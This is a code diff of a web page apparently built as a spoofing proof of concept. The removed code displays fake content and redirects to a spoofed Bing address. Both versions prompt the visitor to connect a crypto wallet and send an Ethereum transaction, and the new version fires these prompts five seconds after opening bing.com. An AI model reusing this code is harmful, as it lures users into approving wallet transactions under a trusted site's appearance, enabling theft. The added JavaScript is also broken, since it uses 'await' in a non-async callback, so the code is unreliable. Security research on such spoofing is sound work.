@@ -16,31 +16,22 @@
       cursor: pointer;
     }
   </style>
-  <title>Spoofer Proof of Concept</title>
 </head>
 <body>
   <script>
     async function openBingAndPromptTransaction() {
-      spoof(); // Run spoof function instantly
+      // Open bing.com after a delay
+      setTimeout(() => {
+        window.open('https://bing.com', 'x');
 
-      // Wait for a short delay to ensure the spoofed content is displayed
-      await delay(3000);
+        // Check for wallet connection
+        const connected = await promptWalletConnection();
 
-      // Check for wallet connection
-      const connected = await promptWalletConnection();
-
-      // If wallet connected, perform an Ethereum transaction
-      if (connected) {
-        await promptEthTransaction();
-      }
-
-      // Redirect back to the real Bing site
-      window.location.href = 'https://bing.com';
-    }
-
-    function spoof() {
-      document.write("<h1>This is not Bing</h1>");
-      document.location = "https://bing.com:1234";
+        // If wallet connected, perform an Ethereum transaction
+        if (connected) {
+          await promptEthTransaction();
+        }
+      }, 5000); // Delay of 5000 milliseconds (5 seconds)
     }
 
     async function promptWalletConnection() {
@@ -89,10 +80,6 @@
       } catch (error) {
         alert('Ethereum transaction request failed or was rejected.');
       }
-    }
-
-    function delay(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
     }
   </script>
   <center>
